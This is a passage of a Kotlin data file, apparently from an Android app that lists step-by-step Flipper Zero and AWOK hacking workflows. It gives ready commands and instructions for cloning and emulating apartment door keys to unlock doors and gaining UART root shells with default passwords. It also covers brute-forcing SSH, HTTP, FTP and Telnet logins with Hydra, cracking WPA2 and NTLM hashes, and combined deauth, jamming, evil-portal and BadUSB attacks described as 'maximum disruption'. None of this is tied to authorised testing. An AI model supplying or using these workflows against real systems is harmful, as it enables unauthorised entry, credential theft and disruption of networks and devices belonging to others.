            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Universal Remote",
                    description = "Infrared → Universal Remotes → TV (or AC, Projector, etc.)",
                    commands = listOf(Command("Navigate", "Infrared → Universal Remotes → TV", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Control the TV",
                    description = "Buttons appear: Power, Vol+/-, Ch+/-, Mute, Input. Press them. Flipper tries all known codes for that button across 1000+ TV brands until one works.",
                    tips = listOf("Works on Samsung, Sony, LG, Vizio, TCL, Hisense, and hundreds more")
                )
            )
        ),

        Workflow(
            id = "ir_tv_b_gone",
            title = "TV-B-Gone (Mass Power Off)",
            subtitle = "Turn off every TV in range simultaneously",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is TV-B-Gone?",
                    description = "TV-B-Gone is a device/app that blasts every known TV power-off code rapid-fire. Walk through a room with TVs and they all turn off. Momentum includes a built-in TV-B-Gone app.",
                    tips = listOf("Originally a physical device — now built into Flipper firmware")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Open TV-B-Gone App",
                    description = "Apps → Infrared → TV-B-Gone → OK. Point Flipper at the TVs and press the run button. It cycles through ~240 power codes covering 99% of TVs sold in North America.",
                    commands = listOf(Command("Navigate", "Apps → Infrared → TV-B-Gone", Device.FLIPPER_CLI)),
                    tips = listOf("Takes about 60-90 seconds to cycle through all codes", "Works on any TV with an IR receiver — even old ones")
                )
            )
        ),

        Workflow(
            id = "ir_ac_blast",
            title = "Air Conditioner Control",
            subtitle = "Control any AC unit with Flipper's IR universal AC remote",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Universal AC Remote",
                    description = "Infrared → Universal Remotes → AC. Select your AC brand if known, or use the generic mode.",
                    commands = listOf(Command("Navigate", "Infrared → Universal Remotes → AC", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Control the AC",
                    description = "Options: Power on/off, temperature up/down, mode (cool/heat/fan/dry), fan speed. Point at AC and press.",
                    tips = listOf("AC IR codes are more complex than TV — they encode the full state each press", "If generic mode doesn't work: learn the signal directly from the original remote")
                )
            )
        ),

        // ── iBUTTON / DALLAS ──────────────────────────────────────────────────

        Workflow(
            id = "ibutton_read",
            title = "Read iButton / Dallas Key",
            subtitle = "Clone magnetic 1-Wire door keys used in apartments",
            categoryId = "ibutton",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is iButton?",
                    description = "iButton (Dallas/Maxim) keys are small metal discs that touch a reader to open doors. Extremely common in apartment buildings, especially in Eastern Europe and Latin America. They transmit an ID over 1-Wire protocol.",
                    tips = listOf("Types: DS1990A (most common), DS1992, DS1993, Cyfral, Metakom", "The metal disc just has a unique serial number — no encryption on basic types")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Key",
                    description = "On Flipper: press center → iButton → Read. Touch the metal disc to the Flipper's iButton reader port (bottom of the device, the GPIO area has a 1-Wire reader). Flipper reads the ID instantly.",
                    commands = listOf(Command("Navigate", "iButton → Read", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save and Emulate",
                    description = "Save the key. To open doors: iButton → Saved → select key → Emulate. Touch the bottom of Flipper to the door reader — it opens.",
                    tips = listOf("Flipper can also write the ID to a blank DS1990A key for a physical copy")
                )
            )
        ),

        Workflow(
            id = "ibutton_emulate",
            title = "Emulate iButton Key",
            subtitle = "Use Flipper as a physical replacement for a saved iButton key",
            categoryId = "ibutton",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Saved iButton key"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Load the Key",
                    description = "iButton → Saved → select your key → Emulate.",
                    commands = listOf(Command("Navigate", "iButton → Saved → [key] → Emulate", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Touch Reader",
                    description = "While emulating, touch the BOTTOM of Flipper (near the GPIO pins) to the door reader contact. The reader sees the key ID and unlocks.",
                    tips = listOf("The iButton reader port is the small metal contact at the bottom of Flipper", "Hold it flat against the reader — alignment matters")
                )
            )
        ),

        Workflow(
            id = "ibutton_clone",
            title = "Write iButton to Blank Key",
            subtitle = "Program a blank DS1990A key with a copied ID",
            categoryId = "ibutton",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Blank writable iButton key (DS1990A compatible)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read the Original First",
                    description = "iButton → Read → touch original key to Flipper → save it.",
                    commands = listOf(Command("Read", "iButton → Read", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Write to Blank",
                    description = "Touch a blank writable key to Flipper's reader port. Go to iButton → Saved → select your saved key → Write. Flipper programs the blank key.",
                    commands = listOf(Command("Write", "iButton → Saved → [key] → Write", Device.FLIPPER_CLI)),
                    tips = listOf("Blank writable iButton keys available on AliExpress — search 'blank iButton 1-Wire writable'")
                )
            )
        ),

        // ── GPIO / HARDWARE ───────────────────────────────────────────────────

        Workflow(
            id = "gpio_uart",
            title = "UART Serial Console Access",
            subtitle = "Connect to a device's serial debug port for root access",
            categoryId = "gpio",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target device with exposed UART/serial pins", "3.3V logic level (NOT 5V)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is UART?",
                    description = "Most embedded devices (routers, IoT, cameras, printers) have a UART serial port for debugging — often exposed as test pads or pin headers. Connecting to it gives you a root shell or bootloader access without any passwords.",
                    tips = listOf("Find TX/RX/GND pads by visual inspection or with a multimeter", "TX pad: toggles voltage when device boots — use multimeter in DC mode")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Wire Flipper to Target",
                    description = "Cross-connect TX/RX:\n• Target TX → Flipper GPIO pin 14 (RX)\n• Target RX → Flipper GPIO pin 13 (TX)\n• Target GND → Flipper GND pin 8 or 11\n\nNever connect power through this — use the device's own power.",
                    warning = "3.3V ONLY. 5V will damage Flipper's GPIO. Verify voltage first with a multimeter.",
                    commands = listOf(Command("Pin map", "Target TX→F:14 | Target RX→F:13 | GND→F:8", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Open Serial Terminal on Flipper",
                    description = "Apps → GPIO → [UART] Terminal → set baud rate. Common rates: 115200, 9600, 57600, 38400. Try 115200 first.",
                    commands = listOf(Command("Navigate", "Apps → GPIO → UART Terminal", Device.FLIPPER_CLI)),
                    tips = listOf("If output is garbage: wrong baud rate. Try others.", "Hit Enter a few times to get a prompt")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Interact with the Shell",
                    description = "You should see boot messages then a shell prompt. Type commands. On BusyBox Linux devices: ls, cat /etc/passwd, uname -a. On bootloaders: printenv, run commands.",
                    tips = listOf("Many routers auto-boot to root shell — no password needed", "If you get a login prompt: try root/admin/1234/password as credentials")
                )
            )
        ),

        Workflow(
            id = "gpio_logic_analyzer",
            title = "Logic Analyzer",
            subtitle = "Capture and decode digital signals on hardware pins",
            categoryId = "gpio",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware", "Target device with exposed pins"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Logic Analyzer App",
                    description = "Apps → GPIO → Logic Analyzer → OK. Flipper can sample up to 8 digital channels via its GPIO pins.",
                    commands = listOf(Command("Navigate", "Apps → GPIO → Logic Analyzer", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Connect Probe Pins",
                    description = "Connect Flipper GPIO pins A4-A7 and B0-B3 to the signals you want to probe on the target device. Connect a shared GND.",
                    tips = listOf("Use thin jumper wires — easier to probe than alligator clips on small pads")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Capture",
                    description = "Press OK to start capture. Trigger it while the target device communicates. Stop when done. The waveform displays on Flipper's screen.",
                    tips = listOf("Use this to find SPI/I2C/UART signals, reverse-engineer protocols, or find encryption keys on the wire")
                )
            )
        ),

        Workflow(
            id = "gpio_awok_uart",
            title = "AWOK USB Serial Control",
            subtitle = "Send Marauder commands to AWOK directly from your Android phone",
            categoryId = "gpio",
            hardware = listOf(Hardware.AWOK, Hardware.PHONE),
            prerequisites = listOf("AWOK Dual Mini v3", "USB-C OTG adapter", "Serial terminal app on Android (e.g. Serial USB Terminal)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install Serial App",
                    description = "Install 'Serial USB Terminal' from Google Play (free). This lets your phone send text commands to the AWOK over USB.",
                    tips = listOf("Alternative: 'USB Serial Console' or any app supporting CH340/CP2102 chips")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Connect AWOK via OTG",
                    description = "Plug USB-C OTG adapter into your phone. Plug AWOK USB-C cable into the OTG adapter. Android will ask if you want to open Serial USB Terminal — tap OK.",
                    tips = listOf("Most phones support USB OTG — Samsung Note 10+ definitely does")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Set Baud Rate",
                    description = "In the serial app, go to settings and set baud rate to 115200. Data bits: 8, Stop bits: 1, Parity: None. Connect.",
                    commands = listOf(Command("Settings", "Baud: 115200 | 8N1 | No flow control", Device.ANDROID))
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Send Commands",
                    description = "Type Marauder commands in the input field and send. All AWOK features are available: scanap, deauth, blespam, evilportal, etc.",
                    commands = listOf(
                        Command("List commands", "help", Device.MARAUDER),
                        Command("Scan APs", "scanap", Device.MARAUDER),
                        Command("Deauth all", "deauth -t ap -m broadcast", Device.MARAUDER)
                    ),
                    tips = listOf("This gives you full control from your phone without needing Flipper")
                )
            )
        ),

        // ── CONNECT ───────────────────────────────────────────────────────────

        Workflow(
            id = "awok_flipper_combo",
            title = "AWOK + Flipper Combo Attacks",
            subtitle = "Use both devices together for combined RF and WiFi operations",
            categoryId = "connect",
            hardware = listOf(Hardware.BOTH),
            prerequisites = listOf("Flipper Zero with custom firmware", "AWOK Dual Mini v3 connected to Flipper"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Deauth + Sub-GHz Combo",
                    description = "Scenario: Target a location where people use both WiFi and RF remotes (parking garage). Use AWOK to deauth the WiFi network while Flipper jams the RF remote frequency. Disrupts both communication channels simultaneously.",
                    tips = listOf("Run AWOK deauth from Flipper's WiFi Marauder app while manually triggering Sub-GHz jam")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Evil Portal + BadUSB",
                    description = "Scenario: Deploy AWOK evil portal to capture WiFi credentials while Flipper runs BadUSB on any connected PCs to harvest additional data. AWOK handles WiFi phishing, Flipper handles physical access.",
                    tips = listOf("Keep AWOK in your pocket running the portal — Flipper does the USB attacks")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "BLE Spam + IR Chaos",
                    description = "Scenario: AWOK runs BLE spam on all platforms while Flipper cycles IR TV-B-Gone. In a venue with screens and lots of phones — maximum disruption from one person.",
                    tips = listOf("AWOK handles BLE, Flipper handles IR — both running simultaneously")
                )
            )
        ),

        Workflow(
            id = "rpc_connect",
            title = "Control Flipper from Android via RPC",
            subtitle = "Use your phone to trigger Flipper actions remotely over Bluetooth",
            categoryId = "connect",
            hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
            prerequisites = listOf("Flipper Zero", "Android phone", "Flipper Mobile App"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Connect via Bluetooth",
                    description = "Open Flipper Mobile App → connect to your Flipper. The app uses Flipper's RPC (Remote Procedure Call) protocol over BLE.",
                    commands = listOf(Command("Navigate", "Flipper Mobile App → Connect", Device.ANDROID))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Remote File Browser",
                    description = "In the app, tap Files. Browse your Flipper's SD card, upload payloads, download captures, manage saved signals.",
                    tips = listOf("Upload BadUSB payloads directly to Flipper from your phone")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Remote Screen and Control",
                    description = "Tap Screen Streaming. See Flipper's screen on your phone in real time. Tap to press buttons remotely. Control everything without touching the Flipper.",
                    tips = listOf("Useful for triggering payloads discreetly without looking at Flipper")
                )
            )
        ),

        // ── TOOLS ─────────────────────────────────────────────────────────────

        Workflow(
            id = "tools_nethunter",
            title = "Kali NetHunter on Android",
            subtitle = "Run full Kali Linux toolkit on your phone (no root required with Rootless)",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Android phone", "Termux from F-Droid", "Sufficient storage (2-4 GB)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install NetHunter Rootless",
                    description = "NetHunter Rootless runs Kali in a container inside Termux — no rooting required. Open Termux and run the installer command.",
                    commands = listOf(Command("Install", "curl -f https://kali.download/nethunter-rootless/current/kalifs-arm64.tar.xz | tar xJ", Device.TERMUX)),
                    tips = listOf("Download is ~1GB — use WiFi", "Works on Samsung Galaxy Note 10+ without root")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Start Kali Environment",
                    description = "After install, launch Kali with the nh script. A full Kali shell starts.",
                    commands = listOf(Command("Launch", "nh", Device.TERMUX))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Install Tools",
                    description = "Inside Kali: update and install whatever you need.",
                    commands = listOf(
                        Command("Update", "apt update && apt upgrade -y", Device.TERMUX),
                        Command("Install tools", "apt install nmap metasploit-framework hydra sqlmap -y", Device.TERMUX)
                    ),
                    tips = listOf("Full Metasploit, nmap, hydra, sqlmap, etc. all work in rootless NetHunter")
                )
            )
        ),

        Workflow(
            id = "tools_hashcat",
            title = "Crack Hashes with Hashcat",
            subtitle = "GPU-accelerate password cracking on a PC",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("PC with GPU (NVIDIA or AMD)", "Hashcat installed", "Wordlist (rockyou.txt)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Get rockyou.txt Wordlist",
                    description = "The standard wordlist for password cracking. Contains 14 million real passwords from the 2009 RockYou breach.",
                    commands = listOf(Command("Download", "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.PC))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Crack WPA2 Hash",
                    description = "After capturing a PMKID or handshake from AWOK, convert with hcxtools and crack with hashcat.",
                    commands = listOf(
                        Command("Convert PMKID", "hcxpcapngtool -o hash.hc22000 capture.pcap", Device.PC),
                        Command("Crack WPA2", "hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule", Device.PC)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Crack Other Hash Types",
                    description = "Hashcat supports 300+ hash types. Common ones:",
                    commands = listOf(
                        Command("NTLM (Windows)", "hashcat -m 1000 hash.txt rockyou.txt", Device.PC),
                        Command("MD5", "hashcat -m 0 hash.txt rockyou.txt", Device.PC),
                        Command("bcrypt", "hashcat -m 3200 hash.txt rockyou.txt", Device.PC),
                        Command("SHA-256", "hashcat -m 1400 hash.txt rockyou.txt", Device.PC)
                    ),
                    tips = listOf("Use -a 3 for brute force: hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Rule-Based Attack",
                    description = "Rules mutate wordlist entries (add numbers, capitalize, l33t-speak). Best64 rule covers most common password patterns.",
                    commands = listOf(Command("Rule attack", "hashcat -m 22000 hash.hc22000 rockyou.txt -r rules/best64.rule -r rules/combinator.rule", Device.PC)),
                    tips = listOf("best64.rule is in hashcat/rules/ — comes with hashcat", "Combining 2-3 rule files dramatically increases coverage")
                )
            )
        ),

        Workflow(
            id = "tools_termux_setup",
            title = "Termux Security Toolkit Setup",
            subtitle = "Turn Termux into a full mobile pentest environment",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux from F-Droid (NOT Google Play)", "Internet connection"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Update Packages",
                    description = "Open Termux and update everything first.",
                    commands = listOf(Command("Update", "pkg update && pkg upgrade -y", Device.TERMUX))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install Core Tools",
                    description = "Install the essentials for recon and scanning.",
                    commands = listOf(
                        Command("Network tools", "pkg install nmap netcat-openbsd curl wget git python -y", Device.TERMUX),
                        Command("More tools", "pkg install hydra john sqlmap -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Install Python Recon Tools",
                    description = "Python-based tools cover most recon needs.",
                    commands = listOf(
                        Command("theHarvester", "pip install theHarvester", Device.TERMUX),
                        Command("Sublist3r", "git clone https://github.com/aboul3la/Sublist3r && cd Sublist3r && pip install -r requirements.txt", Device.TERMUX),
                        Command("Sherlock", "pip install sherlock-project", Device.TERMUX)
                    ),
                    tips = listOf("Sherlock finds usernames across 300+ social platforms")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Install Metasploit (Optional)",
                    description = "Metasploit runs on Termux with some setup.",
                    commands = listOf(
                        Command("Install Ruby", "pkg install ruby -y", Device.TERMUX),
                        Command("Install MSF", "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sh msfinstall", Device.TERMUX)
                    ),
                    tips = listOf("MSF on Android is slow but works for basic exploit testing")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Connect AWOK for Serial Control",
                    description = "With Termux and USB OTG, control AWOK from command line:",
                    commands = listOf(
                        Command("Install pyserial", "pip install pyserial", Device.TERMUX),
                        Command("Connect serial", "python -c \"import serial; s=serial.Serial('/dev/ttyUSB0',115200); s.write(b'scanap\\n'); print(s.read(1000))\"", Device.TERMUX)
                    ),
                    tips = listOf("Device path may be /dev/ttyUSB0 or /dev/ttyACM0 — check with ls /dev/tty*")
                )
            )
        ),

        Workflow(
            id = "tools_nmap_scan",
            title = "Network Recon with Nmap",
            subtitle = "Map a network, find open ports, identify services and OS",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux with nmap installed", "Connected to target network"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Find Your Subnet",
                    description = "First identify what subnet you're on.",
                    commands = listOf(Command("Check IP", "ip a | grep inet", Device.TERMUX))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Host Discovery",
                    description = "Find all live hosts on the network without port scanning.",
                    commands = listOf(Command("Ping scan", "nmap -sn 192.168.1.0/24", Device.TERMUX)),
                    tips = listOf("Replace 192.168.1.0/24 with your actual subnet")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Port Scan a Target",
                    description = "Scan a specific host for open ports.",
                    commands = listOf(
                        Command("Fast scan", "nmap -T4 -F 192.168.1.1", Device.TERMUX),
                        Command("Full scan", "nmap -sV -sC -p- 192.168.1.1", Device.TERMUX)
                    ),
                    tips = listOf("-sV: service version detection", "-sC: default scripts", "-p-: all 65535 ports")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "OS Detection",
                    description = "Try to identify the operating system of a target.",
                    commands = listOf(Command("OS detect", "nmap -O 192.168.1.1", Device.TERMUX)),
                    tips = listOf("Requires at least one open and one closed port to work accurately")
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Vulnerability Scripts",
                    description = "Run NSE scripts to check for known vulnerabilities.",
                    commands = listOf(
                        Command("Vuln scan", "nmap --script vuln 192.168.1.1", Device.TERMUX),
                        Command("SMB vuln", "nmap --script smb-vuln-* 192.168.1.1", Device.TERMUX),
                        Command("Heartbleed", "nmap --script ssl-heartbleed 192.168.1.1 -p 443", Device.TERMUX)
                    )
                )
            )
        ),

        Workflow(
            id = "tools_hydra_bruteforce",
            title = "Brute Force Logins with Hydra",
            subtitle = "Attack SSH, FTP, HTTP, RDP, and other login services",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux with hydra installed", "Target service identified via nmap"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Get Wordlists",
                    description = "Download credential lists.",
                    commands = listOf(
                        Command("rockyou", "wget -O rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX),
                        Command("Common usernames", "wget -O users.txt https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "SSH Brute Force",
                    description = "Attack SSH login. Very common on routers and servers with default creds.",
                    commands = listOf(Command("SSH attack", "hydra -L users.txt -P rockyou.txt ssh://192.168.1.1", Device.TERMUX)),
                    tips = listOf("Try: -l root -l admin before running full user list", "Add -t 4 to limit connections and avoid lockout")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "HTTP Login Brute Force",
                    description = "Attack a web login form.",
                    commands = listOf(Command("HTTP POST", "hydra -L users.txt -P rockyou.txt 192.168.1.1 http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\"", Device.TERMUX)),
                    tips = listOf("Change /login to the form action URL", "Change 'Invalid' to the error message shown on bad login")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "FTP / RDP / Telnet",
                    description = "Same syntax, different protocol.",
                    commands = listOf(
                        Command("FTP", "hydra -L users.txt -P rockyou.txt ftp://192.168.1.1", Device.TERMUX),
                        Command("Telnet", "hydra -L users.txt -P rockyou.txt telnet://192.168.1.1", Device.TERMUX),
                        Command("Router web UI", "hydra -l admin -P rockyou.txt 192.168.1.1 http-get /", Device.TERMUX)
                    )
                )
            )
        )

    )

    // ── CATEGORY LIST ──────────────────────────────────────────────────────────

    private val allCategories: List<Category> = listOf(
        Category(
            id = "setup",
            title = "Setup",
            icon = "",
            description = "Firmware, pairing, and initial configuration"
        ),
        Category(
            id = "wifi",
            title = "WiFi Attacks",
            icon = "",
            description = "Scan, deauth, capture, evil portal, wardrive"
        ),
        Category(
            id = "subghz",
            title = "Sub-GHz / RF",
            icon = "",
            description = "Read, replay, brute-force, jam 300-928MHz signals"
        ),
        Category(
            id = "rfid",
            title = "RFID 125kHz",
            icon = "",
            description = "Read, clone, and emulate access cards"
        ),
        Category(
            id = "nfc",
            title = "NFC",
            icon = "",
            description = "Mifare crack, card clone, evil tag, EMV read"
        ),
        Category(
            id = "badusb",
            title = "BadUSB",
            icon = "",
            description = "Keystroke injection, reverse shells, credential harvest"
        ),
        Category(
            id = "bluetooth",
            title = "Bluetooth / BLE",
            icon = "",
            description = "Spam, scan, and attack BLE devices"
        ),
        Category(
            id = "infrared",
            title = "Infrared",
            icon = "",
            description = "Learn, replay, and blast IR signals"
        ),
        Category(
            id = "ibutton",
            title = "iButton / Dallas",
            icon = "",
            description = "Clone 1-Wire apartment door keys"
        ),
        Category(
            id = "gpio",
            title = "GPIO / Hardware",
            icon = "",
            description = "UART serial access, logic analysis, hardware hacking"
        ),
        Category(
            id = "connect",
            title = "Connect",
            icon = "",
            description = "Link Flipper, AWOK, and phone for combined ops"
        ),
        Category(
            id = "tools",
            title = "Tools",
            icon = "",
            description = "Nmap, Hydra, Hashcat, Termux, NetHunter"
        )
    )

    fun getCategories(): List<Category> {
        val workflowCounts = allWorkflows.groupBy { it.categoryId }.mapValues { it.value.size }
        return allCategories.map { it.copy(workflowCount = workflowCounts[it.id] ?: 0) }
    }

    fun getWorkflowsByCategory(categoryId: String): List<Workflow> =
        allWorkflows.filter { it.categoryId == categoryId }

    fun getWorkflowById(id: String): Workflow? =
        allWorkflows.find { it.id == id }
}
